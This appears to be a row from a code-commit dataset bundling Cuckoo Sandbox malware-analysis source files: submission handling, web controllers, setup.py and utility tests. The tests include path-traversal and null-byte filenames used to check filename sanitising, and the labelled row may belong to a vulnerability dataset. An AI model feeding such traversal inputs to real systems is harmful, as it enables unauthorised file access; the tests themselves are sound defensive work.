        """"""Locate all directories/results available for this analysis""""""
        if not os.path.exists(analysis_path):
            raise Exception(""Analysis path not found: %s"" % analysis_path)

        dirs, files = [], []
        for filename in os.listdir(analysis_path):
            path = os.path.join(analysis_path, filename)
            if os.path.isdir(path):
                dirs.append((filename, len(os.listdir(path))))
            else:
                files.append(filename)

        return dirs, files
/n/n/n",1
48,168cabf86730d56b7fa319278bf0f0034052666a,"cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, filename)

                unpacked = sflock.unpack(
                    filepath=filepath, password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree(sanitize=True)

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return files

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/ncuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.common.mongo import mongo
from cuckoo.core.database import Database, TASK_PENDING

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")

        task = db.view_task(task_id, details=True)
        if not task:
            return Http404(""Task not found"")

        entry = task.to_dict()
        entry[""guest""] = {}
        if task.guest:
            entry[""guest""] = task.guest.to_dict()

        entry[""errors""] = []
        for error in task.errors:
            entry[""errors""].append(error.message)

        entry[""sample""] = {}
        if task.sample_id:
            sample = db.view_sample(task.sample_id)
            entry[""sample""] = sample.to_dict()

        entry[""target""] = os.path.basename(entry[""target""])
        return {
            ""task"": entry,
        }

    @staticmethod
    def get_recent(limit=50, offset=0):
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/ncuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        files = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""files"": files,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/nsetup.py/n/n#!/usr/bin/env python
# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.
# See the file 'docs/LICENSE' for copying permission.

import os
import setuptools
import sys

# Update the MANIFEST.in file to include the one monitor version that is
# actively shipped for this distribution and exclude all the other monitors
# that we have lying around. Note: I tried to do this is in a better manner
# through exclude_package_data, but without much luck.

excl, monitor = [], os.path.join(""cuckoo"", ""data"", ""monitor"")
latest = open(os.path.join(monitor, ""latest""), ""rb"").read().strip()
for h in os.listdir(monitor):
    if h != ""latest"" and h != latest:
        excl.append(
            ""recursive-exclude cuckoo/data/monitor/%s *  # AUTOGENERATED"" % h
        )

if not os.path.isdir(os.path.join(monitor, latest)) and \
        not os.environ.get(""ONLYINSTALL""):
    sys.exit(
        ""Failure locating the monitoring binaries that belong to the latest ""
        ""monitor release. Please include those to create a distribution.""
    )

manifest = []
for line in open(""MANIFEST.in"", ""rb""):
    if not line.strip() or ""# AUTOGENERATED"" in line:
        continue

    manifest.append(line.strip())

manifest.extend(excl)

open(""MANIFEST.in"", ""wb"").write(""\n"".join(manifest) + ""\n"")

def githash():
    """"""Extracts the current Git hash.""""""
    git_head = os.path.join("".git"", ""HEAD"")
    if os.path.exists(git_head):
        head = open(git_head, ""rb"").read().strip()
        if not head.startswith(""ref: ""):
            return head

        git_ref = os.path.join("".git"", head.split()[1])
        if os.path.exists(git_ref):
            return open(git_ref, ""rb"").read().strip()

cwd_path = os.path.join(""cuckoo"", ""data-private"", "".cwd"")
open(cwd_path, ""wb"").write(githash() or """")

install_requires = []

# M2Crypto relies on swig being installed. We also don't support the latest
# version of SWIG. We should be replacing M2Crypto by something else when
# the time allows us to do so.
if os.path.exists(""/usr/bin/swig""):
    install_requires.append(""m2crypto==0.24.0"")

setuptools.setup(
    name=""Cuckoo"",
    version=""2.0.0"",
    author=""Stichting Cuckoo Foundation"",
    author_email=""cuckoo@cuckoofoundation.org"",
    packages=[
        ""cuckoo"",
    ],
    classifiers=[
        ""Development Status :: 4 - Beta"",
        # TODO: should become stable.
        # ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Environment :: Web Environment"",
        ""Framework :: Django"",
        ""Framework :: Flask"",
        ""Framework :: Pytest"",
        ""Intended Audience :: Information Technology"",
        ""Intended Audience :: Science/Research"",
        ""Natural Language :: English"",
        ""License :: OSI Approved :: GNU General Public License v3 (GPLv3)"",
        ""Operating System :: POSIX :: Linux"",
        ""Programming Language :: Python :: 2.7"",
        ""Topic :: Security"",
    ],
    url=""https://cuckoosandbox.org/"",
    license=""GPLv3"",
    description=""Automated Malware Analysis System"",
    include_package_data=True,
    entry_points={
        ""console_scripts"": [
            ""cuckoo = cuckoo.main:main"",
        ],
    },
    install_requires=[
        ""alembic==0.8.8"",
        ""androguard==3.0"",
        ""beautifulsoup4==4.4.1"",
        ""chardet==2.3.0"",
        ""click==6.6"",
        ""django==1.8.4"",
        ""django_extensions==1.6.7"",
        ""dpkt==1.8.7"",
        ""elasticsearch==2.2.0"",
        ""flask==0.10.1"",
        ""httpreplay==0.1.18"",
        ""jinja2==2.8"",
        ""jsbeautifier==1.6.2"",
        ""lxml==3.6.0"",
        ""oletools==0.42"",
        ""peepdf==0.3.2"",
        ""pefile2==1.2.11"",
        ""pillow==3.2"",
        ""pymisp==2.4.54"",
        ""pymongo==3.0.3"",
        ""python-dateutil==2.4.2"",
        ""python-magic==0.4.12"",
        ""sflock==0.2.5"",
        ""sqlalchemy==1.0.8"",
        ""wakeonlan==0.2.2"",
    ] + install_requires,
    extras_require={
        "":sys_platform == 'win32'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'darwin'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'linux2'"": [
            ""requests[security]==2.7.0"",
            ""scapy==2.3.2"",
        ],
        ""distributed"": [
            ""flask-sqlalchemy==2.1"",
            ""gevent==1.1.1"",
            ""psycopg2==2.6.2"",
        ],
        ""postgresql"": [
            ""psycopg2==2.6.2"",
        ],
    },
    setup_requires=[
        ""pytest-runner"",
    ],
    tests_require=[
        ""coveralls"",
        ""pytest"",
        ""pytest-cov"",
        ""pytest-django"",
        ""pytest-pythonpath"",
        ""flask-sqlalchemy==2.1"",
        ""mock==2.0.0"",
        ""responses==0.5.1"",
    ],
)
/n/n/ntests/test_utils.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import cStringIO
import io
import mock
import os
import pytest
import shutil
import tempfile

import cuckoo

from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage, temppath
from cuckoo.common import utils
from cuckoo.misc import set_cwd

class TestCreateFolders:
    def setup(self):
        self.tmp_dir = tempfile.gettempdir()

    def test_root_folder(self):
        """"""Tests a single folder creation based on the root parameter.""""""
        Folders.create(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_single_folder(self):
        """"""Tests a single folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_multiple_folders(self):
        """"""Tests multiple folders creation.""""""
        Folders.create(self.tmp_dir, [""foo"", ""bar""])
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""bar""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""bar""))

    def test_copy_folder(self):
        """"""Tests recursive folder copy""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.copy(""tests/files/sample_analysis_storage"", dirpath)
        assert os.path.isfile(""%s/reports/report.json"" % dirpath)

    def test_duplicate_folder(self):
        """"""Tests a duplicate folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.create(self.tmp_dir, ""foo"")
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder(self):
        """"""Tests folder deletion #1.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(os.path.join(self.tmp_dir, ""foo""))
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder2(self):
        """"""Tests folder deletion #2.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(self.tmp_dir, ""foo"")
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_create_temp(self):
        """"""Test creation of temporary directory.""""""
        dirpath1 = Folders.create_temp(""/tmp"")
        dirpath2 = Folders.create_temp(""/tmp"")
        assert os.path.exists(dirpath1)
        assert os.path.exists(dirpath2)
        assert dirpath1 != dirpath2

    def test_create_temp_conf(self):
        """"""Test creation of temporary directory with configuration.""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        dirpath2 = Folders.create_temp()
        assert dirpath2.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    @pytest.mark.skipif(""sys.platform != 'linux2'"")
    def test_create_invld_linux(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""/invalid/directory"")

    @pytest.mark.skipif(""sys.platform != 'win32'"")
    def test_create_invld_windows(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""Z:\\invalid\\directory"")

    def test_delete_invld(self):
        """"""Test deletion of a folder we can't access.""""""
        dirpath = tempfile.mkdtemp()

        os.chmod(dirpath, 0)
        with pytest.raises(CuckooOperationalError):
            Folders.delete(dirpath)

        os.chmod(dirpath, 0775)
        Folders.delete(dirpath)

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""a"")
        Folders.create((dirpath, ""a""), ""b"")
        Files.create((dirpath, ""a"", ""b""), ""c.txt"", ""nested"")

        filepath = os.path.join(dirpath, ""a"", ""b"", ""c.txt"")
        assert open(filepath, ""rb"").read() == ""nested""

class TestCreateFile:
    def test_temp_file(self):
        filepath1 = Files.temp_put(""hello"", ""/tmp"")
        filepath2 = Files.temp_put(""hello"", ""/tmp"")
        assert open(filepath1, ""rb"").read() == ""hello""
        assert open(filepath2, ""rb"").read() == ""hello""
        assert filepath1 != filepath2

    def test_create(self):
        dirpath = tempfile.mkdtemp()
        Files.create(dirpath, ""a.txt"", ""foo"")
        assert open(os.path.join(dirpath, ""a.txt""), ""rb"").read() == ""foo""
        shutil.rmtree(dirpath)

    def test_named_temp(self):
        filepath = Files.temp_named_put(""test"", ""hello.txt"", ""/tmp"")
        assert open(filepath, ""rb"").read() == ""test""
        assert os.path.basename(filepath) == ""hello.txt""

    def test_temp_conf(self):
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        filepath = Files.temp_put(""foo"")
        assert filepath.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    def test_stringio(self):
        filepath = Files.temp_put(cStringIO.StringIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_bytesio(self):
        filepath = Files.temp_put(io.BytesIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_create_bytesio(self):
        dirpath = tempfile.mkdtemp()
        filepath = Files.create(dirpath, ""a.txt"", io.BytesIO(""A""*1024*1024))
        assert open(filepath, ""rb"").read() == ""A""*1024*1024

    def test_hash_file(self):
        filepath = Files.temp_put(""hehe"", ""/tmp"")
        assert Files.md5_file(filepath) == ""529ca8050a00180790cf88b63468826a""
        assert Files.sha1_file(filepath) == ""42525bb6d3b0dc06bb78ae548733e8fbb55446b3""
        assert Files.sha256_file(filepath) == ""0ebe2eca800cf7bd9d9d9f9f4aafbc0c77ae155f43bbbeca69cb256a24c7f9bb""

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""foo"")
        Files.create((dirpath, ""foo""), ""a.txt"", ""bar"")

        filepath = os.path.join(dirpath, ""foo"", ""a.txt"")
        assert open(filepath, ""rb"").read() == ""bar""

    def test_fd_exhaustion(self):
        fd, filepath = tempfile.mkstemp()

        for x in xrange(0x100):
            Files.temp_put(""foo"")

        fd2, filepath = tempfile.mkstemp()

        # Let's leave a bit of working space.
        assert fd2 - fd < 64

class TestStorage:
    def test_basename(self):
        assert Storage.get_filename_from_path(""C:\\a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:\\\x00a.txt"") == ""\x00a.txt""
        assert Storage.get_filename_from_path(""/tmp/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""../../b.txt"") == ""b.txt""
        assert Storage.get_filename_from_path(""..\\..\\c.txt"") == ""c.txt""

class TestConvertChar:
    def test_utf(self):
        assert ""\\xe9"", utils.convert_char(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_char(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_char(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_char(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_char("" "")

class TestConvertToPrintable:
    def test_utf(self):
        assert ""\\xe9"" == utils.convert_to_printable(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_to_printable(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_to_printable(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_to_printable(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_to_printable("" "")

    def test_non_printable(self):
        assert r""\x0b"" == utils.convert_to_printable(chr(11))

class TestIsPrintable:
    def test_utf(self):
        assert not utils.is_printable(u""\xe9"")

    def test_digit(self):
        assert utils.is_printable(u""9"")

    def test_literal(self):
        assert utils.is_printable(""e"")

    def test_punctation(self):
        assert utils.is_printable(""."")

    def test_whitespace(self):
        assert utils.is_printable("" "")

    def test_non_printable(self):
        assert not utils.is_printable(chr(11))

def test_version():
    from cuckoo import __version__
    from cuckoo.misc import version
    assert __version__ == version

def test_exception():
    s = utils.exception_message()
    assert ""Cuckoo version: %s"" % cuckoo.__version__ in s
    assert ""alembic:"" in s
    assert ""django-extensions:"" in s
    assert ""peepdf:"" in s
    assert ""sflock:"" in s

def test_guid():
    assert utils.guid_name(""{0002e005-0000-0000-c000-000000000046}"") == ""InprocServer32""
    assert utils.guid_name(""{13709620-c279-11ce-a49e-444553540000}"") == ""Shell""

def test_jsbeautify():
    js = {
        ""if(1){a(1,2,3);}"": ""if (1) {\n    a(1, 2, 3);\n}"",
    }
    for k, v in js.items():
        assert utils.jsbeautify(k) == v

@mock.patch(""cuckoo.common.utils.jsbeautifier"")
def test_jsbeautify_packer(p, capsys):
    def beautify(s):
        print u""error: Unknown p.a.c.k.e.r. encoding.\n"",

    p.beautify.side_effect = beautify
    utils.jsbeautify(""thisisjavascript"")
    out, err = capsys.readouterr()
    assert not out and not err

def test_htmlprettify():
    html = {
        ""<a href=google.com>wow</a>"": '<a href=""google.com"">\n wow\n</a>',
    }
    for k, v in html.items():
        assert utils.htmlprettify(k) == v

def test_temppath():
    dirpath = tempfile.mkdtemp()
    set_cwd(dirpath)
    Folders.create(dirpath, ""conf"")

    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = ""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /tmp""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /custom/directory""
    )
    assert temppath() == ""/custom/directory""

def test_bool():
    assert utils.parse_bool(""true"") is True
    assert utils.parse_bool(""True"") is True
    assert utils.parse_bool(""yes"") is True
    assert utils.parse_bool(""on"") is True
    assert utils.parse_bool(""1"") is True

    assert utils.parse_bool(""false"") is False
    assert utils.parse_bool(""False"") is False
    assert utils.parse_bool(""None"") is False
    assert utils.parse_bool(""no"") is False
    assert utils.parse_bool(""off"") is False
    assert utils.parse_bool(""0"") is False

    assert utils.parse_bool(""2"") is True
    assert utils.parse_bool(""3"") is True

